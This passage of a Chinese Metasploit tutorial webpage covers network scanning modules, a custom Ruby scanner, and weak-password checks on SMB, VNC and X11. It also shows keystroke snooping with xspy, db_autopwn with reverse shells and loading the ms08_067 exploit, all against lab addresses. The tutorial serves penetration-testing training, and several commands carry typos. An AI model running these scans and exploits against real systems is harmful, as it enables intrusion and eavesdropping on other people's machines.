plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>扫描SNMP主机：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/snmp/snmp_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="6编写自定义扫描模块">6、编写自定义扫描模块：<a class="hash-link" href="#6编写自定义扫描模块" title="标题的直接链接">​</a></h3><p>MSF框架提供对其所有exploit和method的访问，支持代理，SSL，报告生成，线程， 使用Ruby语言。</p><p>例子：一个简单的自定义扫描模块</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#Metasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::Tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf:Auxiliary::Scanner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Name’ =&gt; ‘My custom TCP scan’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Version’ =&gt; ‘$Revision: 1$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Description’ =&gt; ‘My quick scanner’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘Author’ =&gt; ‘Your name here’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ‘License’ =&gt; ‘MSF_LICENSE’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Opt::RPORT(12345)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run_host(ip)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    connect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sock.puts(‘HELLO SERVER’)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data = sock.recv(1024)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        print_status(“Received: #{data} from #{ip}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        disconnect()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>测试：将模块保存到modules/auxiliary/scanner/目录下面,命名为simple_tcp.rb，注意保存的位置很重要。</p><p>使用nc监听一个端口测试这个模块：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo “Hello Metasploit” &gt; banner.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nc –lvnp 12345 &lt; banner.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/simple_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Received: Hello Metasploit from 192.168.1.111</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="四基本漏洞扫描">四．基本漏洞扫描<a class="hash-link" href="#四基本漏洞扫描" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-基本扫描">1 基本扫描<a class="hash-link" href="#1-基本扫描" title="标题的直接链接">​</a></h3><p>1、使用nc与目标端口通信，获取目标端口的信息：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET HTTP 1/1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server: Microsoft-IIS/5.1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>  1: 还有一个功能与nc类似的工具Ncat，产自nmap社区，可实现相同功能：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ncat -C 192.168.1.111 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GET / HTTP/1.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>  2：题外：ncat还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l --chat   其他客户端：ncat chatserver</p><p>  3：ncat还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：
服务器（server.example.com）上：<code>ncat -l --keep-open 80 --output caidao.log &gt; /dev/null</code>  然后使用菜刀连接<a href="http://server.example.com/nc.php" target="_blank" rel="noopener noreferrer">http://server.example.com/nc.php</a> 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，--output换为--hex-dump就可以了。</p><p>  4：其实与nc功能类似的工具在bt5里面还有很多，比如还有一个sbd：</p><p>监听：<code>sbd -l -p 12345</code></p><p>连接：<code>sbd 192.168.1.111 12345</code></p><p>  5：当然也可以用来聊天，与ncat的不同之处在于ncat自动对用户编号user1、user2、...，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：</p><p>pc1：<code>sbd -l -p 12345 -P chowner</code></p><p>pc2：<code>sbd pc1 12345 -P evil</code></p><p>  6：其实nc也可以用来聊天的：</p><p>pc1：<code>nc -l -p 12345</code></p><p>pc2: <code>telnet pc1 12345</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-与nexpose结合扫描">2 与NeXpose结合扫描：<a class="hash-link" href="#2-与nexpose结合扫描" title="标题的直接链接">​</a></h3><p>在nexpose中扫描目标并生成xml格式的报告后，将报告导入到msf：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/host_test.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svvs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在MSF中运行nexpose：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_destroy postgres:toor@127.0.0.l1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nexpose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect –h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_connect nexpose:toor@192.168.1.111 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nexpose_scan 192.168.1.195</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>（如果你想在bt5里安装nexpose的话建议把bt5硬盘空间多留几十G，这玩意硬盘小了不让装。）</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3与nessus结合扫描">3、与nessus结合扫描：<a class="hash-link" href="#3与nessus结合扫描" title="标题的直接链接">​</a></h3><p>使用Nessus扫描完成后生成.nessus格式的报告，导入到MSF：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /tmp/nessus_report_Host_test.nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>在MSF中使用Nessus：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load nessus</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_connect nessus:toor@192.168.1.111:8834 ok</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_policy_list  #查看存在的扫描规则</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_new 2 bridge_scan 192.168.1.111 #2表示规则的ID号，bridge_scan自定义扫描名称</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_scan_status #查看扫描进行状态</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_list  #查看扫描结果</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nessus_report_get skjla243-3b5d-*******   #导入报告</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_hosts –c address,svcs,vulns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="4特殊扫描">4、特殊扫描：<a class="hash-link" href="#4特殊扫描" title="标题的直接链接">​</a></h3><p>SMB弱口令:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smb/smb_login</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111-222</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBUser Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass admin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>VNC空口令：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/vnc/vnc_none_auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Open X11空口令：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/x11/open_x11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.0/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set THREADS 50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/sniffers/xspy/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./xspy –display 192.168.1.125:0 –delay 100</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="5使用autopwn处理扫描结果">5、使用Autopwn处理扫描结果：<a class="hash-link" href="#5使用autopwn处理扫描结果" title="标题的直接链接">​</a></h3><p>autopwn选项：e执行attack   t查看匹配模块   r使用reverse shell作为payload   x基于漏洞筛选模块  p基于端口筛选模块</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">db_connect postgres:toor@127.0.0.1/msf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_import /root/nessus.nbe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db_autopwn –e –t –r –x –p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>-e 针对符合条件的目标加载所有exploit -t显示所有匹配的exploit -r使用反弹shell</li><li>-x 基于漏洞筛选模块 -p基于端口筛选模块</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="五基础溢出命令">五．基础溢出命令<a class="hash-link" href="#五基础溢出命令" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1基本命令">1、基本命令：<a class="hash-link" href="#1基本命令" title="标题的直接链接">​</a></h3><p>查看可用溢出模块<code>show exploits</code>
查看辅助模块<code>show auxiliary</code>  包括扫描器，拒绝服务模块，fuzzer工具或其他。
查看可用选项<code>show options</code></p><p>加载模块后退出此模块 back</p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">back</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>搜索模块 search</p><p>例子： <code>searh mssql search ms08_067</code></p><p>查看当前模块可用的payload： <code>show payloads</code></p><p>例子：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show payloads</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>查看可选的目标类型<code>show targets</code>
查看更多信息<code>info</code>
设置一个选项或取消设置 <code>set/unset</code>
设置或取消全局选项 <code>setg/unsetg</code>  例如设置LHOST就可以用setg，避免后面重复设置
保存全局选项的设置 <code>save</code>   当下次启动仍然生效
